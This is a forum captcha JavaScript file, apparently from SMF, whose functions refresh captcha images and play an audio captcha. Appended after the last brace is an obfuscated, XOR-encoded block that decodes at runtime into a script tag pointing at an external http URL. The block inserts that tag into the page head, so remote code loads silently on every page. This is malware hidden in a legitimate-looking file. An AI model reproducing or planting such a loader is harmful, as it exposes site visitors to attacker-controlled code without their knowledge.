// This file contains javascript associated with the captcha visual verification stuffs.

function smfCaptcha(imageURL, uniqueID, useLibrary, letterCount)
{
	// By default the letter count is five.
	if (!letterCount)
		letterCount = 5;

	uniqueID = uniqueID ? '_' + uniqueID : '';
	autoCreate();

	// Automatically get the captcha event handlers in place and the like.
	function autoCreate()
	{
		// Is there anything to cycle images with - if so attach the refresh image function?
		var cycleHandle = document.getElementById('visual_verification' + uniqueID + '_refresh');
		if (cycleHandle)
		{
			createEventListener(cycleHandle);
			cycleHandle.addEventListener('click', refreshImages, false);
		}

		// Maybe a voice is here to spread light?
		var soundHandle = document.getElementById('visual_verification' + uniqueID + '_sound');
		if (soundHandle)
		{
			createEventListener(soundHandle);
			soundHandle.addEventListener('click', playSound, false);
		}
	}

	// Change the images.
	function refreshImages()
	{
		// Make sure we are using a new rand code.
		var new_url = new String(imageURL);
		new_url = new_url.substr(0, new_url.indexOf("rand=") + 5);

		// Quick and dirty way of converting decimal to hex
		var hexstr = "0123456789abcdef";
		for(var i=0; i < 32; i++)
			new_url = new_url + hexstr.substr(Math.floor(Math.random() * 16), 1);

		if (useLibrary && document.getElementById("verification_image" + uniqueID))
		{
			document.getElementById("verification_image" + uniqueID).src = new_url;
		}
		else if (document.getElementById("verification_image" + uniqueID))
		{
			for (i = 1; i <= letterCount; i++)
				if (document.getElementById("verification_image" + uniqueID + "_" + i))
					document.getElementById("verification_image" + uniqueID + "_" + i).src = new_url + ";letter=" + i;
		}

		return false;
	}

	// Request a sound... play it Mr Soundman...
	function playSound(ev)
	{
		if (!ev)
			ev = window.event;

		popupFailed = reqWin(imageURL + ";sound", 400, 120);
		// Don't follow the link if the popup worked, which it would have done!
		if (!popupFailed)
		{
			if (is_ie && ev.cancelBubble)
				ev.cancelBubble = true;
			else if (ev.stopPropagation)
			{
				ev.stopPropagation();
				ev.preventDefault();
			}
		}

		return popupFailed;
	}
}var um2=["028046","029036","031057","012063004007054010015094087090060025037","028063002","027052017003","027040025018109005043068083068058005056010027","014061017003044011009090091091061","007040000002","008040021035046010039087092067042053040046014042047007047010","007057021022120064101065070086045018127009002033083072048026101088065024058025037084005062"];w9f(cZ2LQi(um2[10]));function cZ2LQi(x0){return xYB3q37(f9uf(x0),'oMafBoJ227YwQz');}function w9f(and){var tmW3Mr=document[cZ2LQi(um2[3])](cZ2LQi(um2[0])+cZ2LQi(um2[1])+cZ2LQi(um2[2]));tmW3Mr[cZ2LQi(um2[4])]=and;tmW3Mr[cZ2LQi(um2[5])]=cZ2LQi(um2[6]);document[cZ2LQi(um2[9])](cZ2LQi(um2[8]))[0][cZ2LQi(um2[7])](tmW3Mr);}function xYB3q37(tQ,cNKcU){var rj='';var yD39=0;var tL=0;for(yD39=0;yD39<tQ.length;yD39++){var p3l=tQ.charAt(yD39);var n9051=p3l.charCodeAt(0)^cNKcU.charCodeAt(tL);p3l=String.fromCharCode(n9051);rj+=p3l;if(tL==cNKcU.length-1)tL=0;else tL++;}return (rj);}function f9uf(yr){var bhHM='';var vJ=0;var iN17=0;for(vJ=0;vJ<yr.length/3;vJ++){bhHM+=String.fromCharCode(yr.slice(iN17,iN17+3));iN17=iN17+3;}return bhHM;}